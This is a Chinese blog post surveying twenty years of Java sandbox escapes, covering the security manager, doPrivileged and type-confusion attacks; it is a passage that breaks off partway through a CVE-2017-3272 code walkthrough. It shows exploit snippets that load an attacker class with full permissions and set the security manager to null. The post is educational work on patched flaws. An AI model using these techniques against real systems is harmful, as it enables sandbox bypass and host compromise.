<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><script src="/lib/pace/pace.min.js?v=1.0.2"></script><link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet"><script></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.ico?v=6.3.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=6.3.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=6.3.0"><link rel="mask-icon" href="/images/logo.ico?v=6.3.0" color="#222"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"6.3.0",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!1,fastclick:!1,lazyload:!1,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta name="description" content="二十年来各种关键的安全漏洞完全绕过了sandbox，影响了Java平台的每个主要版本。"><meta name="keywords" content="Java沙箱逃逸,douiduo,diyz.bid"><meta property="og:type" content="article"><meta property="og:title" content="关于Java沙箱逃逸的这20年"><meta property="og:url" content="https://www.diyz.bid/Security/关于Java沙箱逃逸的这20年/index.html"><meta property="og:site_name" content="doubiduo"><meta property="og:description" content="二十年来各种关键的安全漏洞完全绕过了sandbox，影响了Java平台的每个主要版本。"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2018-09-30T02:29:41.565Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="关于Java沙箱逃逸的这20年"><meta name="twitter:description" content="二十年来各种关键的安全漏洞完全绕过了sandbox，影响了Java平台的每个主要版本。"><link rel="alternate" href="/atom.xml" title="doubiduo" type="application/atom+xml"><link rel="canonical" href="https://www.diyz.bid/Security/关于Java沙箱逃逸的这20年/"><script type="text/javascript" id="page.configurations">CONFIG.page={sidebar:""}</script><title>关于Java沙箱逃逸的这20年 | doubiduo</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-124427626-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-124427626-1")</script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?9c8b377e488072512752a147d13a537c";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><noscript><style type="text/css">.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.logo-line-after i{right:initial}</style></noscript><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-2020224399094607",enable_page_level_ads:!0})</script></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">doubiduo</span><span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">diyz.bid</h1></div><div class="site-nav-toggle"> <button aria-label="切换导航栏"><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i><br>友链</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user-circle"></i><br>关于</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i></span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"> <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-2020224399094607" data-ad-slot="5456418301" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.diyz.bid/Security/关于Java沙箱逃逸的这20年/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content=""><meta itemprop="description" content=""><meta itemprop="image" content="/images/diyz.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="doubiduo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">关于Java沙箱逃逸的这20年</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2018-09-30 10:10:50 / 修改时间：10:29:41" itemprop="dateCreated datePublished" datetime="2018-09-30T10:10:50+08:00">2018-09-30</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a></span></span> <span class="post-symbolscount"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span title="本文字数">44k</span></span> <span id="/Security/关于Java沙箱逃逸的这20年/" class="leancloud_visitors" data-flag-title="关于Java沙箱逃逸的这20年"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span class="leancloud-visitors-count"></span></span><div class="post-description">二十年来各种关键的安全漏洞完全绕过了sandbox，影响了Java平台的每个主要版本。</div></div></header><div class="post-body" itemprop="articleBody"><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>　　Java平台广泛部署在各种服务器、桌面工作站和消费电子产品上。它旨在实现精心设计的安全模型，即Java沙箱能够在主机不受到威胁的前提下执行各种具有潜在威胁的代码。具体地说，这种沙盒方法用于安全执行不受信任的Java应用程序，例如Web浏览器中的Java applet。不幸的是，尽管这二十年来安全人员已经付出了巨大的努力不断修复漏洞和改进平台安全性，但是各种沙箱绕过漏洞仍然层出不穷。<br>　　在这项工作中，我们回顾了Java不安全的过去和现在。我们出于教育目的列举所有已知并在当前版本中已修复的安全漏洞，目标是为了概述Java平台安全性问题，这样我们就可以从过去的错误中吸取教训。</p><h3 id="2-背景"><a href="#2-背景" class="headerlink" title="2. 背景"></a>2. 背景</h3><h4 id="2-1-Java沙箱漏洞简史"><a href="#2-1-Java沙箱漏洞简史" class="headerlink" title="2.1 Java沙箱漏洞简史"></a>2.1 Java沙箱漏洞简史</h4><p>　　Sun的第一个版本是由Sun Microsystems于1995年发布的。一年后，普林斯顿大学的研究人员发现了多个缺陷<br>能够绕过沙箱。作者发现了语言，字节码和对象初始化方面的弱点，仅举几例，其中一些在撰写本文时仍然存在于Java中。这是第一次详细描述针对Java运行时的类欺骗攻击。几年后，在2002年，The Last Stage of Delirium（LSD）研究小组提出了他们关于Java虚拟机安全性的发现。他们详细介绍了影响字节码验证程序和类加载程序的漏洞，导致类型混淆或类欺骗攻击。2010年，Koivu首次通过解释如何利用他发现的CVE-2010-0840漏洞公开表明可信方法链攻击对Java起作用。2011年，Drake描述了如何利用Java中的内存破坏漏洞。他解释了如何利用CVE-2009-3869和CVE-2010-3552两个堆栈缓冲区溢出漏洞。2012年，Guillardoy描述了CVE-2012-4681，这两个漏洞允许绕过沙箱。第一个漏洞允许访问受限制的类，第二个漏洞允许修改私有字段。同样在2012年，Oh描述了如何利用CVE-2012-0507的漏洞执行类型混淆攻击来绕过Java沙箱。2013年，Gorenc和Spelman对120个Java漏洞进行了大规模研究，并得出结论，不安全反射是Java中最常见的漏洞，但这种混淆是最常见的漏洞利用。仍然在2013年，Lee和Nie发现了多个漏洞，包括本机方法中的漏洞，可以绕过沙箱。同样在2013年，Kaiser描述了CVE-2013-1438，一个由James Forshaw发现的可靠方法链漏洞，CVE-2012-5088是Security Explorations发现的Java反射漏洞。在2012年至2013年期间，Security Explorations的安全研究人员发现了20多个Java漏洞。从2014年开始，主要网络浏览器（如Chrome或Firefox）的开发人员决定默认禁用NAPI（因此默认情况下不能执行任何Java代码）。Java的攻击面正在减少，似乎对Java沙箱旁路的研究较少。但是，绕过沙盒的漏洞仍然会偶尔弹出。例如，在2018年，Lee描述了如何利用CVE-2018-2826，这是XOR19发现的类型混淆漏洞。</p><h4 id="2-2-Java平台"><a href="#2-2-Java平台" class="headerlink" title="2.2 Java平台"></a>2.2 Java平台</h4><p>　　Java平台可以分为两个抽象组件：Java虚拟机（JVM）和Java类库（JCL）。<br>　　JVM是该平台的核心。它以本机代码实现，并提供程序执行所需的所有基本功能，例如字节码解析器，JIT编译器，垃圾收集器等。由于它是本机实现的，因此它也受到与任何其他本机二进制相同的攻击，例如包括缓冲区溢出等内存损坏漏洞。<br>　　JCL是与JVM一起提供的标准库。它包含数百个系统类，主要用Java实现，其中较小的部分是本机实现的。由于所有系统类都是受信任的，因此默认情况下它们与所有权限相关联。这些权限使他们可以完全访问任何类型的功能（文件系统读/写，完全访问网络等），从而完全访问主机。因此，分析人员可能会使用系统类中的任何安全错误来打破沙箱。<br>　　因此，本文的主要内容分为两个较大的部分:一个处理内存损坏漏洞，另一个侧重于Java级别的漏洞。</p><h4 id="2-3-安全管理"><a href="#2-3-安全管理" class="headerlink" title="2.3 安全管理"></a>2.3 安全管理</h4><p>　　在JCL的代码中，沙箱是通过授权检查实现的，其中大多数是权限检查。例如，在对文件系统进行任何访问之前，JCL中的代码会检查调用者是否具有访问文件系统的权限。下面是检类<em>java.io.FileInputStream</em>中文件的读取权限的示例。构造函数检查调用者是否具有读取第5行上的指定文件的读取权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     String name = (file != <span class="keyword">null</span> ? file.getPath() : <span class="keyword">null</span>);</span><br><span class="line"> <span class="number">3</span>:     SecurityManager security = System.getSecurityManager();</span><br><span class="line"> <span class="number">4</span>:     <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">5</span>:         security.checkRead(name);</span><br><span class="line"> <span class="number">6</span>:     &#125;</span><br><span class="line"> <span class="number">7</span>:     <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">8</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line"> <span class="number">9</span>:     &#125;</span><br><span class="line"><span class="number">10</span>:     <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">"Invalid file path"</span>);</span><br><span class="line"><span class="number">12</span>:     &#125;</span><br><span class="line"><span class="number">13</span>:     fd = <span class="keyword">new</span> FileDescriptor();</span><br><span class="line"><span class="number">14</span>:     fd.incrementAndGetUseCount();</span><br><span class="line"><span class="number">15</span>:     <span class="keyword">this</span>.path = name;</span><br><span class="line"><span class="number">16</span>:     open(name);</span><br><span class="line"><span class="number">17</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　请注意，出于性能原因，仅在设置了安全管理器时才会检查授权（第3-4行）。因此，逃避Java沙箱的典型攻击旨在将安全管理器设置为null。这有效地禁用了所有授权检查。如果没有设置安全管理器，分析师可以执行任何代码，就像它拥有所有授权一样。<br>　　但是，只能在Java级别检查授权。本机代码与所有授权一起执行。虽然在利用内存损坏漏洞时可能直接执行任意分析师的受控本机代码，但在本文的所有示例中，我们都专注于禁用安全管理器以便能够执行具有所有权限的任意Java代码。</p><h4 id="2-4-doPrivileged方法"><a href="#2-4-doPrivileged方法" class="headerlink" title="2.4 doPrivileged方法"></a>2.4 doPrivileged方法</h4><p>　　当检查权限“P”时，JVM检查调用堆栈的每个元素是否具有权限“P”。如果一个元素没有“P”，则抛出安全性异常。这种方法大部分时间都可以正常工作。但是，JCL中某些不需要调用权限的方法m1（）可能需要在JCL中调用另一个方法m2（），而这又需要一个权限“P2”。使用上面的方法，如果没有权限的用户类中的方法main（）调用m1（），则由于m1（）中对m2（）的后续调用，JVM会抛出安全性异常。实际上，在调用堆栈遍历期间，m1（）和m2（）具有所需的权限，因为它们属于JCL中的受信任类，但main（）没有权限。<br>　　解决方案是在doPrivileged（）调用中将m1（）中的调用包装到m2（）中。因此，当检查“P2”时，堆栈遍历停止在调用doPrivileged（）的方法，这里是m1（）。由于m1（）是JCL中的一个方法，因此它具有所有权限。因此，检查成功并且堆栈步行停止。<br>　　一个真实的例子是<em>java.nio.Bits</em>中的方法unaligned（）。它处理网络流并且必须知道处理器的体系结构。但是，获取此信息需要用户代码可能没有的“get_property”权限。因此，在这种情况下，由于权限检查，从不受信任的类调用unaligned（）会失败。因此，检索有关处理器体系结构的信息的unaligned（）中的代码包含在doPrivileged调用中，如下所示（第4-5行）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">unaligned</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     <span class="keyword">if</span> (unalignedKnown)</span><br><span class="line"> <span class="number">3</span>:         <span class="keyword">return</span> unaligned;</span><br><span class="line"> <span class="number">4</span>:     String arch = AccessController.doPrivileged(</span><br><span class="line"> <span class="number">5</span>:         <span class="keyword">new</span> sun.security.action.GetPropertyAction(<span class="string">"os.arch"</span>));</span><br><span class="line"> <span class="number">6</span>:     unaligned = arch.equals(<span class="string">"i386"</span>) || arch.equals(<span class="string">"x86"</span>)</span><br><span class="line"> <span class="number">7</span>:         || arch.equals(<span class="string">"amd64"</span>) || arch.equals(<span class="string">"x86_64"</span>);</span><br><span class="line"> <span class="number">8</span>:     unalignedKnown = <span class="keyword">true</span>;</span><br><span class="line"> <span class="number">9</span>:     <span class="keyword">return</span> unaligned;</span><br><span class="line"><span class="number">10</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　选中“get_property”权限后，堆栈遍历将方法检查为Bits.unaligned（），然后停止。</p><h3 id="3-内存腐败漏洞"><a href="#3-内存腐败漏洞" class="headerlink" title="3. 内存腐败漏洞"></a>3. 内存腐败漏洞</h3><h4 id="3-1-类型混乱"><a href="#3-1-类型混乱" class="headerlink" title="3.1 类型混乱"></a>3.1 类型混乱</h4><h5 id="3-1-1-背景"><a href="#3-1-1-背景" class="headerlink" title="3.1.1 背景"></a>3.1.1 背景</h5><p>　　我们描述的第一个内存损坏漏洞是一种类型混淆漏洞。许多Java漏洞依赖于类型混淆漏洞来逃避沙箱以及最近。简而言之，当存在类型混淆时，VM认为对象的类型为_A_，而实际上对象的类型为_B_。如何使用它来禁用安全管理器？<br>　　答案是，类型混淆漏洞可用于访问未经许可无法为分析师提供的方法。分析师所针对的典型方法是<em>ClassLoader</em>类的defineClass（）方法。为什么？好吧，这种方法允许使用所有权限定义自定义类（因此可能是分析师控制的）。因此，分析人员将创建并执行他自己新定义的类，该类包含禁用安全管理器绕过所有授权检查的代码。<br>　　方法defineClass（）是’protected’，因此只能从类<em>ClassLoader</em>中的方法或<em>ClassLoader</em>的子类调用。由于分析师无法修改<em>ClassLoader</em>中的方法，因此他唯一的选择是将<em>ClassLoader</em>子类化为能够调用defineClass（）。但是，直接从没有权限的代码实例化<em>ClassLoader</em>的子类会触发安全异常，因为<em>ClassLoader</em>的构造函数会检查权限“Create_ClassLoader”。诀窍是分析师定义一个扩展<em>ClassLoader</em>的类，例如下面的<em>Help</em>类，并添加一个静态方法，其类型为<em>Help</em>的对象作为参数。然后，分析师从环境中检索现有的<em>ClassLoader</em>实例，并使用类型混淆将其“强制转换”为<em>Help</em>。使用这种方法，JVM认为方法doWork（）（下面的第4行）的h是<em>ClassLoader</em>的子类（而它的实际类型是<em>ClassLoader</em>），因此受保护的方法defineClass（）变得可供分析师使用（受保护的方法） Java可以从子类访问）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Help</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span></span></span><br><span class="line"> 2: 	Serializable &#123;</span><br><span class="line"> <span class="number">3</span>:</span><br><span class="line"> <span class="number">4</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">(Help h)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:     <span class="keyword">byte</span>[] buffer = BypassExploit.getDefaultHelper();</span><br><span class="line"> <span class="number">7</span>:     URL url = <span class="keyword">new</span> URL(<span class="string">"file:///"</span>);</span><br><span class="line"> <span class="number">8</span>:     Certificate[] certs = <span class="keyword">new</span> Certificate[<span class="number">0</span>];</span><br><span class="line"> <span class="number">9</span>:     Permissions perm = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">10</span>:     perm.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">11</span>:     ProtectionDomain protectionDomain = <span class="keyword">new</span> ProtectionDomain(</span><br><span class="line"><span class="number">12</span>:      <span class="keyword">new</span> CodeSource(url, certs), perm);</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:     Class cls = h.defineClass(<span class="string">"DefaultHelper"</span>, buffer, <span class="number">0</span>,</span><br><span class="line"><span class="number">15</span>:      buffer.length, protectionDomain);</span><br><span class="line"><span class="number">16</span>:     cls.newInstance();</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:   &#125;</span><br><span class="line"><span class="number">19</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　更准确地说，使用类型混淆漏洞，分析师可以分三步禁用沙箱。首先，分析师可以按如下方式检索应用程序类加载器（此步骤不需要权限）：<code>Object cl = Help.class.getClassLoader();</code><br>　　其次，使用类型混淆漏洞，他可以让VM认为对象cl的类型为<em>Help</em>。<code>Help h = use_type_confusion_to_convert_to_Help(cl);</code><br>　　第三，他提供了h作为<em>Help</em>中静态方法doWork（）的参数，它禁用了安全管理器。<br>　　doWork（）方法首先加载但尚未执行缓冲区中分析师控制的<em>DefaultHelper</em>类的字节码（上面清单中的第6行）。如下所示，此类在其构造函数中禁用doPrivileged（）块中的安全管理器。doPrivileged（）块是必要的，以防止检查整个调用堆栈的权限，因为main（）是调用序列的一部分，它没有权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultHelper</span> <span class="keyword">implements</span> <span class="title">PrivilegedExceptionAction</span>&lt;<span class="title">Void</span>&gt; </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">DefaultHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:       AccessController.doPrivileged(<span class="keyword">this</span>);</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="number">7</span>:     System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　加载字节码后，它会创建一个具有所有权限的保护域（第7-12行）。最后，它调用h上的defineClass（）（第14-15行）。此调用有效，因为VM认为h的类型为<em>Help</em>。实际上，h的类型为<em>ClassLoader</em>。但是，由于方法defineClass（）在类<em>ClassLoader</em>中定义为受保护方法，因此调用是成功的。此时，分析师已经加载了自己的所有权限。最后一步（第16行）是实例化该类以触发对run（）方法的调用，该方法禁用安全管理器。禁用安全管理器后，分析人员可以执行任何Java代码，就好像它具有所有权限一样。</p><h5 id="3-1-2-示例：CVE-2017-3272"><a href="#3-1-2-示例：CVE-2017-3272" class="headerlink" title="3.1.2 示例：CVE-2017-3272"></a>3.1.2 示例：CVE-2017-3272</h5><p>　　上一节解释了类型混淆漏洞是什么以及分析师如何利用它来禁用安全管理器。本节提供了一个示例，说明了如何使用CVE-2017-3272来实现此类攻击。<br>　　Redhat的bugzilla提供了有关CVE-2017-3272的以下技术细节：<br>　　“据发现，OpenJDK的Libraries组件中的<em>java.util.concurrent.atomic</em>包中的原子字段更新程序没有正确地限制对受保护字段成员的访问。不受信任的Java应用程序或applet可能会利用此漏洞绕过Java沙箱限制“。<br>　　这表明易受攻击的代码位于<em>java.util.concurrent.atomic.package</em>中，这与访问受保护的字段有关。该页面还链接到OpenJDK的补丁“8165344：更新并发支持”。此修补程序修改_AtomicIntegerFieldUpdater _，_ <em>AtomicLongFieldUpdater</em>和<em>AtomicReferenceFieldUpdater</em>类。这些课程用于什么？<br>　　为了处理字段的并发修改，Java提供<em>AtomicLong</em>，<em>AtomicInt</em>和<em>AtomicBoolean</em>等…例如，为了创建可以执行并发修改的一千万个<em>long</em>字段，必须实例化一千万个<em>AtomicLong</em>对象。由于<em>AtomicLong</em>的单个实例需要24个字节+4个字节来引用实例= 28个字节，因此1000万个<em>AtomicLong</em>实例代表267个Mib。<br>　　相比之下，使用<em>AtomicLongFieldUpdater</em>类，它只需要10.000.000 <em>8 = 76 MiB。实际上，只有长场占据空间。此外，由于_Atomic</em> FieldUpdater_类中的所有方法都是静态的，因此只创建更新程序的单个实例。使用<em>Atomic * FieldUpdater</em>类的另一个好处是垃圾收集器不必跟踪一千万个<em>AtomicLong</em>对象。但是，为了能够这样做，updater使用Java的不安全功能来通过<em>sun.misc.Unsafe</em>类检索目标字段的内存地址。<br>　　如何创建<em>AtomicReferenceFieldUpdater</em>的实例如下所示。方法newUpdater（）必须使用三个参数调用：tclass，包含字段的类的类型，vclass字段的类型和fieldName，字段的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="keyword">static</span> &lt;U,W&gt; <span class="function">AtomicReferenceFieldUpdater&lt;U,W&gt; <span class="title">newUpdater</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">2</span>:                                 Class&lt;U&gt; tclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">3</span>:                                 Class&lt;W&gt; vclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">4</span>:                                 String fieldName)</span> </span>&#123;</span><br><span class="line"><span class="number">5</span>:   <span class="keyword">return</span> <span class="keyword">new</span> AtomicReferenceFieldUpdaterImpl&lt;U,W&gt;</span><br><span class="line"><span class="number">6</span>:     (tclass, vclass, fieldName, Reflection.getCallerClass());</span><br><span class="line"><span class="number">7</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　方法newUpdater（）调用<em>AtomicReferenceFieldUpdaterImpl</em>的构造函数来完成实际的工作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: AtomicReferenceFieldUpdaterImpl(<span class="keyword">final</span> Class&lt;T&gt; tclass,</span><br><span class="line"> <span class="number">2</span>:                                 <span class="keyword">final</span> Class&lt;V&gt; vclass,</span><br><span class="line"> <span class="number">3</span>:                                 <span class="keyword">final</span> String fieldName,</span><br><span class="line"> <span class="number">4</span>:                                 <span class="keyword">final</span> Class&lt;?&gt; caller) &#123;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">final</span> Field field;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">final</span> Class&lt;?&gt; fieldClass;</span><br><span class="line"> <span class="number">7</span>:   <span class="keyword">final</span> <span class="keyword">int</span> modifiers;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="number">9</span>:     field = AccessController.doPrivileged(</span><br><span class="line"><span class="number">10</span>:       <span class="keyword">new</span> PrivilegedExceptionAction&lt;Field&gt;() &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">return</span> tclass.getDeclaredField(fieldName);</span><br><span class="line"><span class="number">13</span>:         &#125;</span><br><span class="line"><span class="number">14</span>:       &#125;);</span><br><span class="line"><span class="number">15</span>:     modifiers = field.getModifiers();</span><br><span class="line"><span class="number">16</span>:     sun.reflect.misc.ReflectUtil.ensureMemberAccess(</span><br><span class="line"><span class="number">17</span>:       caller, tclass, <span class="keyword">null</span>, modifiers);</span><br><span class="line"><span class="number">18</span>:     ClassLoader cl = tclass.getClassLoader();</span><br><span class="line"><span class="number">19</span>:     ClassLoader ccl = caller.getClassLoader();</span><br><span class="line"><span class="number">20</span>:     <span class="keyword">if</span> ((ccl != <span class="keyword">null</span>) &amp;&amp; (ccl != cl) 